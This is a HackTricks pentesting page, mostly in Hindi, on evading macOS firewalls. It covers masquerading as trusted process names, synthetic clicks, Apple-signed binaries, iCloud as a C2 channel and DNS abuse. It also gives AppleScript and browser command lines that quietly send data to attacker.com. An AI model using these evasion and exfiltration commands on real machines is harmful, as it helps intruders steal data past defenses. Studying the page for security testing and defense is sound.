# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Found techniques

कुछ तकनीकें macOS फ़ायरवॉल ऐप्स में काम करती पाई गईं।

### Abusing whitelist names

- उदाहरण के लिए, **`launchd`** जैसे प्रसिद्ध macOS प्रक्रियाओं के नामों के साथ मैलवेयर को कॉल करना

### Synthetic Click

- यदि फ़ायरवॉल उपयोगकर्ता से अनुमति मांगता है, तो मैलवेयर को **अनुमति पर क्लिक** करने के लिए कहें

### **Use Apple signed binaries**

- जैसे **`curl`**, लेकिन अन्य जैसे **`whois`** भी

### Well known apple domains

फ़ायरवॉल प्रसिद्ध एप्पल डोमेन जैसे **`apple.com`** या **`icloud.com`** के लिए कनेक्शन की अनुमति दे सकता है। और iCloud को C2 के रूप में उपयोग किया जा सकता है।

### Generic Bypass

फ़ायरवॉल को बायपास करने के लिए कुछ विचार

### Check allowed traffic

अनुमत ट्रैफ़िक को जानने से आपको संभावित रूप से व्हाइटलिस्टेड डोमेन या उन अनुप्रयोगों की पहचान करने में मदद मिलेगी जिन्हें उन तक पहुँचने की अनुमति है।
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNS का दुरुपयोग

DNS समाधान **`mdnsreponder`** साइन किए गए एप्लिकेशन के माध्यम से किए जाते हैं जो शायद DNS सर्वरों से संपर्क करने की अनुमति दी जाएगी।

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### ब्राउज़र ऐप्स के माध्यम से

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- गूगल क्रोम
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- फ़ायरफ़ॉक्स
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- सफारी
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### प्रक्रियाओं में कोड इंजेक्शन के माध्यम से

यदि आप किसी **प्रक्रिया में कोड इंजेक्ट कर सकते हैं** जिसे किसी भी सर्वर से कनेक्ट करने की अनुमति है, तो आप फ़ायरवॉल सुरक्षा को बायपास कर सकते हैं:

{{#ref}}
macos-proces-abuse/
{{#endref}}

## संदर्भ

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

{{#include ../../banners/hacktricks-training.md}}
